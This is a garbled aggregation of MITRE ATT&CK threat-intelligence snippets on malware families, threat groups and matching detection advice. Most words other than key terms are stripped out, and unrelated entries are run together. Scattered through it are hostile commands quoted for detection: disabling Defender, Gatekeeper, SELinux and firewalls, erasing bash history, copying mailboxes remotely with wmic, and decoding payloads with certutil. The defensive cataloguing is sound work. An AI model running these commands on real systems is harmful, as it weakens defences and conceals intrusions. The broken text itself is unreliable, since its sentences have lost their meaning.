[PROMETHIUM](https://attack.mitre.org/groups/G0056) named services legitimate.(Citation: Talos Promethium June 2020)(Citation: Bitdefender StrongPity June 2020) Enable Audit Kerberos Service Ticket Operations log Kerberos TGS service ticket requests. investigate irregular patterns activity (ex: accounts numerous requests, Event 4769, time frame, request RC4 encryption [Type 0x17]).(Citation: Detecting Kerberoasting Feb 2018) (Citation: AdSecurity Cracking Kerberos Dec 2015) (Citation: Symantec WastedLocker June 2020) [BADNEWS](https://attack.mitre.org/software/S0128) command download .exe process hollowing inject process.(Citation: Forcepoint Monsoon)(Citation: TrendMicro Patchwork Dec 2017) Implement network-based filtering restrictions prohibit data transfers untrusted VPCs. [Derusbi](https://attack.mitre.org/software/S0021) unencrypted port 443 C2.(Citation: Fidelis Turbo) [Catchamas](https://attack.mitre.org/software/S0261) gathers Mac address, IP address, network adapter victim’s machine.(Citation: Symantec Catchamas April 2018) [Clop](https://attack.mitre.org/software/S0611) modifications Registry keys.(Citation: Cybereason Clop Dec 2020)  [Machete](https://attack.mitre.org/software/S0409) logs keystrokes victim’s machine.(Citation: ESET Machete July 2019)(Citation: Securelist Machete Aug 2014)(Citation: Cylance Machete Mar 2017)(Citation: 360 Machete Sep 2020) [Zeus Panda](https://attack.mitre.org/software/S0330) queries system's keyboard mapping determine language system. terminate execution detects LANG_RUSSIAN, LANG_BELARUSIAN, LANG_KAZAK, LANG_UKRAINIAN.(Citation: Talos Zeus Panda Nov 2017) Periodically review hybrid identity solution discrepancies. example, review PTA agents Azure Management Portal identify unwanted unapproved ones.(Citation: Mandiant Azure Backdoors) ADFS use, review DLLs executable files FS Global Assembly Cache directories ensure signed Microsoft. Note binaries catalog-signed, file unsigned viewing file properties.(Citation: MagicWeb) [Hi-Zor](https://attack.mitre.org/software/S0087) encrypts C2 traffic TLS.(Citation: Fidelis Hi-Zor) [BLUELIGHT](https://attack.mitre.org/software/S0657) check infected machine VM tools running.(Citation: Volexity InkySquid BLUELIGHT August 2021) Monitor files unexpected modifications unusual accounts normal administration duties   [Indrik Spider](https://attack.mitre.org/groups/G0119) encrypted domain-controlled systems [BitPaymer](https://attack.mitre.org/software/S0570).(Citation: Crowdstrike Indrik November 2018) [SHOTPUT](https://attack.mitre.org/software/S0063) [netstat](https://attack.mitre.org/software/S0104) list TCP connection status.(Citation: Palo Alto CVE-2015-3113 July 2015) [NanoCore](https://attack.mitre.org/software/S0336) DES encrypt C2 traffic.(Citation: PaloAlto NanoCore Feb 2016) [MURKYTOP](https://attack.mitre.org/software/S0233) capability schedule remote jobs.(Citation: FireEye Periscope March 2018) [ThreatNeedle](https://attack.mitre.org/software/S0665) save configuration data RC4-encrypted Registry key: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\GameCon`.(Citation: Kaspersky ThreatNeedle Feb 2021) Monitor execution commands arguments disabling modification security software processes services <code>Set-MpPreference-DisableScriptScanning 1</code> Windows,<code>sudo spctl --master-disable</code> macOS, <code>setenforce 0</code> Linux. Furthermore, Windows monitor execution taskkill.exe commands deactivate antivirus software security systems.  [PlugX](https://attack.mitre.org/software/S0013) configured raw TCP UDP command control.(Citation: Dell TG-3390) [Gamaredon Group](https://attack.mitre.org/groups/G0047) file stealer gather victim's username send C2 server.(Citation: Palo Alto Gamaredon Feb 2017) [EnvyScout](https://attack.mitre.org/software/S0634) JavaScript code extract encoded blob body write disk.(Citation: MSTIC Nobelium Toolset 2021) Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. Monitor third-party application logging, messaging, artifacts abuse SQL stored procedures establish persistent access systems. MSSQL Server, monitoring xp_cmdshell usage.(Citation: NetSPI Startup Stored Procedures) enabling audit features log malicious startup activities. [Poseidon Group](https://attack.mitre.org/groups/G0033) searches administrator accounts local victim machine network.(Citation: Kaspersky Poseidon Group) [Ramsay](https://attack.mitre.org/software/S0458) conduct initial scan Word documents local system, removable media, connected network drives, tagging collecting them. continue tagging documents collect follow scans.(Citation: Eset Ramsay 2020)	 [APT32](https://attack.mitre.org/groups/G0050) enumerated DC servers command <code>net "Domain Controllers" /domain</code>. <code>ping</code> command.(Citation: Cybereason Cobalt Kitty 2017) [Cleaver](https://attack.mitre.org/groups/G0003) created fake LinkedIn profiles included profile photos, details, connections.(Citation: Dell Threat 2889) (Citation: Secureworks IRON LIBERTY July 2019)(Citation: US-CERT TA18-074A) [Milan](https://attack.mitre.org/software/S1015) upload files compromised host.(Citation: ClearSky Siamesekitten August 2021) [T9000](https://attack.mitre.org/software/S0098) gathers beacons username logged account installation. gather username running processes determine running SYSTEM.(Citation: Palo Alto T9000 Feb 2016) [CharmPower](https://attack.mitre.org/software/S0674) ability list running processes `tasklist`.(Citation: Check APT35 CharmPower January 2022) [Mis-Type](https://attack.mitre.org/software/S0084) attempts Base64-encoded network protocol raw TCP socket C2, method fails, falls secondary HTTP-based protocol communicate alternate C2 server.(Citation: Cylance Dust Storm) (Citation: ClearSky Wilted Tulip July 2017) [StrongPity](https://attack.mitre.org/software/S0491) encrypted C2 traffic SSL/TLS.(Citation: Talos Promethium June 2020) [Ursnif](https://attack.mitre.org/software/S0386) Registry modifications installation routine.(Citation: TrendMicro BKDR_URSNIF.SM)(Citation: ProofPoint Ursnif Aug 2016) Monitor attempt user gain access network computing resource, providing credentials cloud service management consoles. cloud providers, AWS, provide distinct log events login attempts management console. [BloodHound](https://attack.mitre.org/software/S0521) PowerShell pull Active Directory target environment.(Citation: CrowdStrike BloodHound April 2018) [QuasarRAT](https://attack.mitre.org/software/S0262) passwords FTP clients.(Citation: GitHub QuasarRAT)(Citation: Volexity Patchwork June 2018) [SUGARUSH](https://attack.mitre.org/software/S1049) `cmd` execution infected host.(Citation: Mandiant UNC3890 Aug 2022) [China Chopper](https://attack.mitre.org/software/S0020)'s server component change timestamp files.(Citation: FireEye Periscope March 2018)(Citation: Lee 2013)(Citation: NCSC Joint Report Public Tools) InstallUtil environment. Script blocking extensions prevent execution scripts HTA files commonly exploitation process. malicious code served ads, adblockers prevent code executing place. [Fox Kitten](https://attack.mitre.org/groups/G0117) source reverse proxy tools including FRPC Proxy establish connections C2 local servers.(Citation: CISA AA20-259A Iran-Based Actor September 2020)(Citation: ClearSky Pay2Kitten December 2020)(Citation: Check Pay2Key November 2020) Monitor logging list settings extracted, ex. Windows EID 4798 4799. Monitor executed commands arguments .scr files. [Diavol](https://attack.mitre.org/software/S0659) enumerate victims' local external IPs registering C2.(Citation: Fortinet Diavol July 2021) [TeamTNT](https://attack.mitre.org/groups/G0139) searched version, architecture, disk partition, logical volume, hostname information.(Citation: ATT TeamTNT Chimaera September 2020)(Citation: Cisco Talos Intelligence Group) Monitor API calls abuse Pre-OS Boot mechanisms establish persistence system. Disk check, forensic utilities, data device drivers API calls) reveal anomalies warrant deeper investigation. (Citation: ITWorld Hard Disk Health Dec 2014) Monitor files accessed exfiltrate data cloud storage service primary command control channel. [QakBot](https://attack.mitre.org/software/S0650) advanced injects steal banking credentials.(Citation: Cyberint Qakbot 2021)(Citation: Kaspersky QakBot September 2021) [S-Type](https://attack.mitre.org/software/S0085) `ipconfig /all` compromised host.(Citation: Cylance Dust Storm) [CaddyWiper](https://attack.mitre.org/software/S0693) alphabetically drives compromised ownership overwrite files.(Citation: ESET CaddyWiper March 2022)(Citation: Cisco CaddyWiper March 2022) [REvil](https://attack.mitre.org/software/S0496) distributed malicious e-mail attachments including Word Documents.(Citation: Data Sodinokibi June 2019)(Citation: Cylance Sodinokibi July 2019)(Citation: Secureworks REvil September 2019)(Citation: McAfee Sodinokibi October 2019)(Citation: Picus Sodinokibi January 2020) encrypting reduce adversary’s ability perform tailored data modifications. Sysinternals [PsExec](https://attack.mitre.org/software/S0029) popular administration tool execute binaries remote systems temporary Windows service.(Citation: Russinovich Sysinternals) Ensure proper Registry permissions prevent adversaries disabling interfering security services. [PowerShower](https://attack.mitre.org/software/S0441) registry key future powershell.exe instances spawned off-screen default, removed registry entries left dropper process.(Citation: Unit 42 Inception November 2018) [USBStealer](https://attack.mitre.org/software/S0136) mimics legitimate Russian program called USB Disk Security.(Citation: ESET Sednit USBStealer 2014) [TeamTNT](https://attack.mitre.org/groups/G0139) encrypted binaries AES encoded files Base64.(Citation: Trend Micro TeamTNT)(Citation: Aqua TeamTNT August 2020) Launch Agent Launch Daemon plist file disk monitored. Plist files located root, system, users <code>/Library/LaunchAgents</code> <code>/Library/LaunchDaemons</code> folders. [Launch Agent](https://attack.mitre.org/techniques/T1543/001) [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) executable paths /tmp /Shared folders locations suspicious. [Confucius](https://attack.mitre.org/groups/G0142) C2 communications.(Citation: Uptycs Confucius APT Jan 2021) [GALLIUM](https://attack.mitre.org/groups/G0093) compressed staged files multi-part archives Recycle Bin prior exfiltration.(Citation: Cybereason Soft Cell June 2019) Monitor executed commands arguments disabling modification firewalls <code>netsh advfirewall firewall set rule group="file printer sharing" enable=Yes</code>,<code>ufw disable</code>, <code>ufw logging off</code>. [More_eggs](https://attack.mitre.org/software/S0284) capability gather IP address victim's machine.(Citation: Talos Cobalt July 2018) [menuPass](https://attack.mitre.org/groups/G0045) [Wevtutil](https://attack.mitre.org/software/S0645) remove PowerShell execution logs.(Citation: Securelist APT10 March 2021) [Amadey](https://attack.mitre.org/software/S1025) collected OS version compromised machine.(Citation: Korean FSI TA505 2020)(Citation: BlackBerry Amadey 2020) [TEMP.Veles](https://attack.mitre.org/groups/G0088) publicly-available PowerShell-based tool, WMImplant.(Citation: FireEye TEMP.Veles 2018) PowerShell perform [Timestomp](https://attack.mitre.org/techniques/T1070/006)ing.(Citation: FireEye TRITON 2019) [CoinTicker](https://attack.mitre.org/software/S0369) decodes initially-downloaded hidden encoded file OpenSSL.(Citation: CoinTicker 2019) [WastedLocker](https://attack.mitre.org/software/S0612) enumerate removable drives prior encryption process.(Citation: Sentinel Labs WastedLocker July 2020) [BACKSPACE](https://attack.mitre.org/software/S0031) attempts avoid detection checking stage command control server determine connect stage server, performs "louder" interactions malware.(Citation: FireEye APT30) [Hydraq](https://attack.mitre.org/software/S0203) creates backdoor remote attackers monitor processes.(Citation: Symantec Trojan.Hydraq Jan 2010)(Citation: Symantec Hydraq Jan 2010) Proactively reset accounts breached credentials immediately, detecting bruteforce attempts. [GoldMax](https://attack.mitre.org/software/S0588) decoy traffic surround malicious network traffic avoid detection.(Citation: MSTIC NOBELIUM Mar 2021) Restrict write access `/Library/Security/SecurityAgentPlugins` directory. Monitor files system-level processes. [TinyTurla](https://attack.mitre.org/software/S0668) contacts C2 based scheduled timing set configuration.(Citation: Talos TinyTurla September 2021) [StrongPity](https://attack.mitre.org/software/S0491) identify hard disk volume serial compromised host.(Citation: Talos Promethium June 2020) [DarkWatchman](https://attack.mitre.org/software/S0673) ability self-extract RAR archive.(Citation: Prevailion DarkWatchman 2021) Verify integrity live processes comparing code memory static binaries, checking jumps instructions redirect code flow. Monitor processes command-line arguments actions change, conceal, delete Registry. reg.exe, regedit.exe)  [SharpStage](https://attack.mitre.org/software/S0546) decompressed data received C2 server.(Citation: BleepingComputer Molerats Dec 2020) [build_downer](https://attack.mitre.org/software/S0471) ability send volume C2.(Citation: Trend Micro Tick November 2019) MSBuild.exe environment removed used. Monitor unexpected creation presence cloud block storage volumes . reduce false positives, valid change management procedures introduce identifier logged change tag header) supported cloud provider, distinguish valid, expected actions malicious ones. Monitor API calls finding domain-level permission settings, NetGroupEnum [APT37](https://attack.mitre.org/groups/G0067) strategic compromises, South Korean websites, distribute malware. torrent file-sharing sites indiscriminately disseminate malware victims. compromises, Javascript based profiler called RICECURRY profile victim's browser deliver malicious code accordingly.(Citation: Securelist ScarCruft Jun 2016)(Citation: FireEye APT37 Feb 2018)(Citation: Volexity InkySquid BLUELIGHT August 2021) (Citation: Talos Kimsuky Nov 2021) [Silence](https://attack.mitre.org/groups/G0091) Nmap scan corporate network, build network topology, identify vulnerable hosts.(Citation: IB Silence Sept 2018)	 [Pony](https://attack.mitre.org/software/S0453) collected C2 POST request.(Citation: Malwarebytes Pony April 2016)	 [menuPass](https://attack.mitre.org/groups/G0045) [certutil](https://attack.mitre.org/software/S0160) macro decode base64-encoded content contained dropper document attached email. <code>certutil -decode</code> decode files victim’s machine dropping [UPPERCUT](https://attack.mitre.org/software/S0275).(Citation: Accenture Hogfish April 2018)(Citation: FireEye APT10 Sept 2018) [NativeZone](https://attack.mitre.org/software/S0637) rundll32 execute malicious DLL.(Citation: SentinelOne NobleBaron June 2021) initial connectivity check fails, [pngdowner](https://attack.mitre.org/software/S0067) attempts extract proxy details credentials Windows Protected Storage Credentials Store. adversary proxy credentials subsequent requests enable outbound access.(Citation: CrowdStrike Putter Panda) Limit domain admin account permissions domain controllers limited servers. Delegate admin functions separate accounts. [JPIN](https://attack.mitre.org/software/S0201) checks presence security-related processes deletes installer/uninstaller component identifies them.(Citation: PLATINUM April 2016) Whitelist applications hashes. 
On Windows 8.1 Windows Server 2012 R2, enable Protected Process Light LSA.(Citation: LSA) Monitor newly constructed files downloaded executed user's computer. Endpoint sensing network sensing detect malicious events file (such Word document PDF reaching internet spawning powershell.exe). [IcedID](https://attack.mitre.org/software/S0483) <code>ZwQueueApcThread</code> inject remote processes.(Citation: IBM IcedID November 2017) [Aoqin Dragon](https://attack.mitre.org/groups/G1007) Heyoka source exfiltration tool subsequently modified operations.(Citation: SentinelOne Aoqin Dragon June 2022) Monitor newly executed processes arguments registered services. network discovery techniques occur operation adversary learns environment. Data events viewed isolation, chain behavior lead activities, Lateral Movement, based obtained. [TeamTNT](https://attack.mitre.org/groups/G0139) enumerated host machine’s IP address.(Citation: Trend Micro TeamTNT) [Cobian RAT](https://attack.mitre.org/software/S0338) obfuscates communications C2 server Base64 encoding.(Citation: Zscaler Cobian Aug 2017) [APT41](https://attack.mitre.org/groups/G0096) enumerated IP addresses network resources <code>netstat</code> command network reconnaissance. malware variant, HIGHNOON, enumerate active RDP sessions.(Citation: FireEye APT41 Aug 2019)(Citation: IB APT 41 June 2021) (Citation: Kaspersky Winnti April 2013)(Citation: Kaspersky Winnti June 2015) [Kimsuky](https://attack.mitre.org/groups/G0094) PowerShell-based keylogger tool called MECHANICAL log keystrokes.(Citation: EST Kimsuky April 2019)(Citation: Securelist Kimsuky Sept 2013)(Citation: CISA AA20-301A Kimsuky)(Citation: Netscout Stolen Pencil Dec 2018)(Citation: Talos Kimsuky Nov 2021)(Citation: KISA Operation Muzabi) [ADVSTORESHELL](https://attack.mitre.org/software/S0045) capable setting deleting Registry values.(Citation: Bitdefender APT28 Dec 2015) [NETEAGLE](https://attack.mitre.org/software/S0034) attempt detect infected host configured proxy. so, [NETEAGLE](https://attack.mitre.org/software/S0034) send beacons POST request; send beacons UDP/6000.(Citation: FireEye APT30) Monitor newly executed processes abuse Office templates persistence compromised system. (Citation: F-Secure Dukes) [APT38](https://attack.mitre.org/groups/G0082) open-source tools [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: ESET Lazarus KillDisk April 2018) Monitoring Windows API calls indicative types code injection generate data defense collected specific circumstances bad sequences calls, benign API functions common difficult distinguish malicious behavior. Windows API calls <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, <code>QueueUserAPC</code>/<code>NtQueueApcThread</code>, modify memory process, <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, technique.(Citation: Elastic Process Injection July 2017) Monitoring Linux specific calls ptrace generate amounts data specialized nature, effective method detect common process injection methods.(Citation: ArtOfMemoryForensics) (Citation: GNU Acct) (Citation: RHEL auditd) (Citation: Chokepoint preload rootkits) [DustySky](https://attack.mitre.org/software/S0062) captures PNG screenshots main screen.(Citation: Kaspersky MoleRATs April 2019) [ShadowPad](https://attack.mitre.org/software/S0596) UDP C2 communications.(Citation: Kaspersky ShadowPad Aug 2017) [LAPSUS$](https://attack.mitre.org/groups/G1004) spammed target users MFA prompts hope legitimate user grant approval.(Citation: MSTIC DEV-0537 Mar 2022) [CHOPSTICK](https://attack.mitre.org/software/S0023) DGA [Fallback Channels](https://attack.mitre.org/techniques/T1008), domains generated concatenating lists.(Citation: ESET Sednit 2017 Activity) Monitor newly executed processes executed Run/RunOnce registry Windows EID 9707 “Software\Microsoft\Windows\CurrentVersion\Run” “Software\Microsoft\Windows\CurrentVersion\RunOnce” registry command line. [Carbanak](https://attack.mitre.org/groups/G0008) VBScript named "ggldr" Google Apps Script, Sheets, Forms services C2.(Citation: Forcepoint Carbanak Google C2) Monitor contextual data file, include name, content (ex: signature, headers, data/media), user/ower, permissions, etc. [Green Lambert](https://attack.mitre.org/software/S0690) encrypted strings.(Citation: Objective Green Lambert OSX Oct 2021)(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021)  [Gelsemium](https://attack.mitre.org/software/S0666) ability inject DLLs specific processes.(Citation: ESET Gelsemium June 2021) [Anchor](https://attack.mitre.org/software/S0504) determine public IP location compromised host.(Citation: Medium Anchor DNS July 2020) [Maze](https://attack.mitre.org/software/S0449) encryption process batch scripts commands.(Citation: FireEye Maze 2020)(Citation: Sophos Maze VM September 2020) [Ebury](https://attack.mitre.org/software/S0377) hook logging functions backdoor logging facility.(Citation: ESET Ebury Feb 2014)	 [Chaes](https://attack.mitre.org/software/S0631) module perform API hooking desires.(Citation: Cybereason Chaes Nov 2020)  [FruitFly](https://attack.mitre.org/software/S0277) executes stores obfuscated Perl scripts.(Citation: objsee mac malware 2017) [RDAT](https://attack.mitre.org/software/S0495) process steganographic images attached email messages send receive C2 commands. [RDAT](https://attack.mitre.org/software/S0495) embed additional messages BMP images communicate [RDAT](https://attack.mitre.org/software/S0495) operator.(Citation: Unit42 RDAT July 2020)	 [InnaputRAT](https://attack.mitre.org/software/S0259) variants attempted legitimate adding service named OfficeUpdateService.(Citation: ASERT InnaputRAT April 2018) [Unknown Logger](https://attack.mitre.org/software/S0130) capable stealing usernames passwords browsers victim machine.(Citation: Forcepoint Monsoon) [Dok](https://attack.mitre.org/software/S0281) prompts user credentials.(Citation: objsee mac malware 2017) [PLEAD](https://attack.mitre.org/software/S0435) executed malicious links e-mails.(Citation: TrendMicro BlackTech June 2017) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors XServer backdoor exfiltrate data.(Citation: FoxIT Wocao December 2019) (Citation: TrendMicro Tonto Team October 2020) [Bundlore](https://attack.mitre.org/software/S0482) attempted users execute malicious .app file Flash Player update.(Citation: MacKeeper Bundlore Apr 2019) (Citation: Bitdefender FunnyDream Campaign November 2020) [Axiom](https://attack.mitre.org/groups/G0001) targeted victims remote administration tools including RDP.(Citation: Novetta-Axiom) [PowGoop](https://attack.mitre.org/software/S1046) send requests malicious servers.(Citation: CYBERCOM Iranian Intel Cyber January 2022) Apply extended ACLs block unauthorized protocols trusted network.(Citation: US-CERT TA17-156A SNMP Abuse 2017) [Kimsuky](https://attack.mitre.org/groups/G0094) packed malware UPX.(Citation: Malwarebytes Kimsuky June 2021) [BloodHound](https://attack.mitre.org/software/S0521) ability map domain trusts identify misconfigurations potential abuse.(Citation: CrowdStrike BloodHound April 2018) [Sakula](https://attack.mitre.org/software/S0074) calls cmd.exe DLL files rundll32.(Citation: Dell Sakula) multiple methods preventing user's command history flushed .bash_history file, including commands:
<code>set +o history</code> <code>set -o history</code> start logging again;
<code>unset HISTFILE</code> user's .bash_rc file; and
<code>ln -s /dev/null ~/.bash_history</code> write commands <code>/dev/null</code>instead. [Saint Bot](https://attack.mitre.org/software/S1018) established persistence copied Startup directory `\Software\Microsoft\Windows\CurrentVersion\Run` registry key.(Citation: Malwarebytes Saint Bot April 2021)(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) Monitor newly constructed network connections (typically ports 139 445), received abnormal untrusted hosts. Correlate network connections remote login events SMB-related activity file transfers remote process execution. (Citation: Secureworks BRONZEUNION Feb 2019) [Avaddon](https://attack.mitre.org/software/S0640) enumerated shared folders mapped volumes.(Citation: Arxiv Avaddon Feb 2021) [EVILNUM](https://attack.mitre.org/software/S0568) modifications Regsitry persistence.(Citation: Prevailion EvilNum 2020) Limit on-premises accounts access hybrid identity solution place. example, limit Azure Global Administrator accounts required, ensure dedicated cloud-only accounts hybrid ones.(Citation: MagicWeb) [Derusbi](https://attack.mitre.org/software/S0021) obfuscates C2 traffic variable 4-byte XOR keys.(Citation: Fidelis Turbo) [Donut](https://attack.mitre.org/software/S0695) generate code modules enable in-memory execution VBScript, JScript, EXE, DLL, dotNET payloads.(Citation: Donut Github) [SDBbot](https://attack.mitre.org/software/S0461) ability communicate C2 TCP port 443.(Citation: Proofpoint TA505 October 2019) [Turian](https://attack.mitre.org/software/S0647) ability Python spawn Unix shell.(Citation: ESET BackdoorDiplomacy Jun 2021) [RegDuke](https://attack.mitre.org/software/S0511) Dropbox C2 server.(Citation: ESET Dukes October 2019) [H1N1](https://attack.mitre.org/software/S0132) command download execute file remotely hosted URL WinINet requests.(Citation: Cisco H1N1 2) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious.  [Bumblebee](https://attack.mitre.org/software/S1039) `LoadLibrary` attempt execute GdiPlus.dll.(Citation: Medium Ali Salem Bumblebee April 2022) [ZxShell](https://attack.mitre.org/software/S0412) remote desktop functionality.(Citation: Talos ZxShell Oct 2014)  [APT32](https://attack.mitre.org/groups/G0050) mshta.exe code execution.(Citation: Cybereason Oceanlotus 2017)(Citation: Cybereason Cobalt Kitty 2017) [PowGoop](https://attack.mitre.org/software/S1046) ability PowerShell scripts execute commands.(Citation: DHS CISA AA22-055A MuddyWater February 2022) [Carbanak](https://attack.mitre.org/software/S0030) create Windows account.(Citation: FireEye CARBANAK June 2017) Monitor newly constructed instances existing, legitimate external service exfiltrate data primary command control channel. Monitor application access tokens interact resources services fit organization baseline. example, application, meant read emails, accessing users’ mail boxes and, potentially, exfiltrating sensitive data. [WannaCry](https://attack.mitre.org/software/S0366) <code>attrib +h</code> files hidden.(Citation: LogRhythm WannaCry) [ChChes](https://attack.mitre.org/software/S0144) collects victim's %TEMP% directory path version Internet Explorer.(Citation: FireEye APT10 April 2017) [menuPass](https://attack.mitre.org/groups/G0045) resized data certificate table enable signing modified files legitimate signatures.(Citation: Securelist APT10 March 2021) [Catchamas](https://attack.mitre.org/software/S0261) steals data stored clipboard.(Citation: Symantec Catchamas April 2018) [BS2005](https://attack.mitre.org/software/S0014) Base64 encoding communication message body request.(Citation: Mandiant Operation Ke3chang November 2014) (Citation: FireEye TRITON 2019)(Citation: Dragos Xenotime 2018) (Citation: Talos Cobalt July 2018)(Citation: Crowdstrike GTR2020 Mar 2020) Monitor files abuse services daemons execute commands programs. Limit restrict program execution anti-virus software. MacOS, whitelist programs allowed plist tag. programs considered suspicious. [Bandook](https://attack.mitre.org/software/S0234) capable image uploading current desktop.(Citation: Lookout Dark Caracal Jan 2018)(Citation: CheckPoint Bandook Nov 2020) (Citation: Novetta-Axiom)(Citation: Cisco 72) [TrickBot](https://attack.mitre.org/software/S0266) downloader icon Word document.(Citation: Cyberreason Anchor December 2019) Monitor newly constructed network connections received untrusted hosts.  [Seasalt](https://attack.mitre.org/software/S0345) capable installing service.(Citation: Mandiant APT1 Appendix) [C0015](https://attack.mitre.org/campaigns/C0015), threat actors Base64-encoded strings.(Citation: DFIR Conti Bazar Nov 2021) [Clambling](https://attack.mitre.org/software/S0660) execute binaries process hollowing.(Citation: Trend Micro DRBControl February 2020) (Citation: Unit 42 Hildegard Malware) Monitor unusual processes access local email files Exfiltration, unusual processes connecting email server network, unusual access patterns authentication attempts public-facing webmail server indicators malicious activity. [Threat Group-3390](https://attack.mitre.org/groups/G0027) actors [gsecdump](https://attack.mitre.org/software/S0008) dump credentials. dumped credentials domain controllers.(Citation: Dell TG-3390)(Citation: SecureWorks BRONZE UNION June 2017) [RTM](https://attack.mitre.org/software/S0148) monitors browsing activity automatically captures screenshots victim browses URL matching list strings.(Citation: ESET RTM Feb 2017)(Citation: Unit42 Redaman January 2019) [Magic Hound](https://attack.mitre.org/groups/G0059) rule victim's Windows firewall RDP traffic - `"netsh" advfirewall firewall add rule name="Terminal Server" dir=in action=allow protocol=TCP localport=3389`.(Citation: DFIR Report APT35 ProxyShell March 2022) Windows 8.1, Windows Server 2012 R2, versions, LSA Protected Process Light (PPL) setting Registry key <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL</code>, requires DLLs loaded LSA signed Microsoft. (Citation: Graeber 2014) (Citation: Configure LSA) [OwaAuth](https://attack.mitre.org/software/S0072) DES-encrypts captured credentials key 12345678 writing credentials log file.(Citation: Dell TG-3390) [FIN8](https://attack.mitre.org/groups/G0061) attempted map C$ enumerated hosts scope current credentials/context.(Citation: FireEye Enemy FIN8 Aug 2016) Monitoring Windows API calls indicative types code injection generate data defense collected specific circumstances bad sequences calls, benign API functions common difficult distinguish malicious behavior. Windows API calls <code>CreateRemoteThread</code> modify memory process, <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, technique.(Citation: Elastic Process Injection July 2017) [IcedID](https://attack.mitre.org/software/S0483) ability download additional modules configuration file C2.(Citation: IBM IcedID November 2017)(Citation: Juniper IcedID June 2020) [Maze](https://attack.mitre.org/software/S0449) created scheduled tasks variants "Windows Update Security", "Windows Update Security Patches", "Google Chrome Security Update", launch [Maze](https://attack.mitre.org/software/S0449) specific time.(Citation: Sophos Maze VM September 2020) [Chimera](https://attack.mitre.org/groups/G0114) multiple password spraying attacks victim's remote services valid user administrator accounts.(Citation: NCC Chimera January 2021) Monitor newly executed processes establish persistence elevate privileges executing malicious content triggered AppCert DLLs loaded processes. Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)).  [Chimera](https://attack.mitre.org/groups/G0114) harvested data victim's e-mail including execution <code>wmic /node:<ip> process create "cmd /c c:\Users\<username>\<path>\backup.pst c:\windows\temp\backup.pst" "i:\<path>\<username>\My Documents\<filename>.pst"
copy</code>.(Citation: NCC Chimera January 2021)  [PingPull](https://attack.mitre.org/software/S1031) variants ability communicate C2 servers ICMP TCP.(Citation: Unit 42 PingPull Jun 2022) [Kevin](https://attack.mitre.org/software/S1020) create directories store logs collected data.(Citation: Kaspersky Lyceum October 2021) [POWRUNER](https://attack.mitre.org/software/S0184) collect running <code>hostname</code> <code>systeminfo</code> victim.(Citation: FireEye APT34 Dec 2017) [Hydraq](https://attack.mitre.org/software/S0203) includes component based code VNC stream live feed desktop infected host.(Citation: Symantec Hydraq Jan 2010) Monitor processes arguments abuse installer packages, including malicious, elevated processes triggered application installations. [HotCroissant](https://attack.mitre.org/software/S0431) ability retrieve list services infected host.(Citation: Carbon Black HotCroissant April 2020) [Operation Honeybee](https://attack.mitre.org/campaigns/C0006), threat actors malicious NTWDBLIB.DLL `cliconfig.exe` bypass UAC protections.(Citation: McAfee Honeybee) [APT29](https://attack.mitre.org/groups/G0016) multiple layers encryption malware protect C2 communication.(Citation: Secureworks IRON HEMLOCK Profile) [Kimsuky](https://attack.mitre.org/groups/G0094) tools capable obtaining credentials saved mail.(Citation: Netscout Stolen Pencil Dec 2018) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [Pillowmint](https://attack.mitre.org/software/S0517) PowerShell script install shim database.(Citation: Trustwave Pillowmint June 2020)	 [Wingbird](https://attack.mitre.org/software/S0176) services.exe register autostart service named "Audit Service" local lsass.exe file.(Citation: SIR 21)(Citation: Wingbird Nov 2017) [Dragonfly](https://attack.mitre.org/groups/G0035) newly created accounts administrators maintain elevated access.(Citation: US-CERT TA18-074A) [HermeticWizard](https://attack.mitre.org/software/S0698) ability scan ports compromised network.(Citation: ESET Hermetic Wizard March 2022) [APT3](https://attack.mitre.org/groups/G0022) tool files directories local file system.(Citation: FireEye Clandestine Fox)(Citation: evolution pirpi) [MarkiRAT](https://attack.mitre.org/software/S0652) masquerade <code>update.exe</code> <code>svehost.exe</code>; mimicked legitimate Telegram Chrome files.(Citation: Kaspersky Ferocious Kitten Jun 2021) (Citation: Trend Micro Tick November 2019) [WellMess](https://attack.mitre.org/software/S0514) identify domain membership current user.(Citation: CISA WellMess July 2020) [APT41](https://attack.mitre.org/groups/G0096) executed <code>file /bin/pwd</code> activity exploiting CVE-2019-19781 Citrix devices.(Citation: FireEye APT41 March 2020) [TEMP.Veles](https://attack.mitre.org/groups/G0088) scheduled task XML triggers.(Citation: FireEye TRITON 2019) [Turla](https://attack.mitre.org/groups/G0010) developed unique malware operations.(Citation: Recorded Future Turla Infra 2020) auditing tools capable detecting DLL search hijacking opportunities systems enterprise correct them. Toolkits PowerSploit framework PowerUp modules explore systems DLL hijacking weaknesses.(Citation: Powersploit) [OilRig](https://attack.mitre.org/groups/G0049) keylogging tools called KEYPUNCH LONGWATCH.(Citation: FireEye APT34 Webinar Dec 2017)(Citation: FireEye APT34 July 2019)	
